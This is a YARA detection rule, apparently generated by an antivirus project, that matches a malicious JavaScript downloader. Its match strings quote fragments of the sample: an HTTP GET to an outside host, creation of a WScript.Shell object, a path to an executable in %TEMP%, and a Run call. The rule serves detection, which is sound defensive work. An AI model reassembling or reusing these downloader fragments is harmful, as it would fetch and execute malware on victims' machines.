rule sig_20160330_f24c38147a6815300c6d8c49dafc1d40 {
  meta:
    description = "datamaliciousorder - file 20160330_f24c38147a6815300c6d8c49dafc1d40.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "e22123dde5bbe698fa8ee8dc8f1a1583943a1c96de1612343c9db5ccaf365724"

  strings:
    $s1  = "R[B](\"GET\", \"http://drirenaeris.com.au/b7eir\", false);" fullword ascii
    $s2  = "function KP(ED, C0){NN = NN * 1; return ED - C0;};" fullword ascii
    $s3  = "var A = function J() {return WScript[VZ](\"WScript\"+\".Shell\");}(), TQ = 11;" fullword ascii
    $s4  = "if (R[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function E(){return U + \"\";};" fullword ascii
    $s6  = "function EF() {return A[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"ZRa4TOL87PD.ex\" + \"e\";};" fullword ascii
    $s7  = "function IL(Y){A[\"Run\"](Y, NN, NN);};" fullword ascii
    $s8  = "function P() {return ((NM == true) && (NM == J2)) ? 1 : NN;};" fullword ascii
    $s9  = "function L(){return 22;};" fullword ascii
    $s10 = "var H = new this[\"Date\"]();" fullword ascii
    $s11 = "function T(O) {var G = (1, 2, 3, 4, 5, O); return G;};" fullword ascii
    $s12 = "return KP(JD, BG);" fullword ascii
    $s13 = "}while (J1);" fullword ascii
    $s14 = "function XS()" fullword ascii
    $s15 = "function FB(){return VZ;};" fullword ascii
    $s16 = "var NM = false;" fullword ascii
    $s17 = "NM = true; " fullword ascii
    $s18 = "var J2 = false;" fullword ascii
    $s19 = "J2 = true; " fullword ascii
    $s20 = "var JS = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}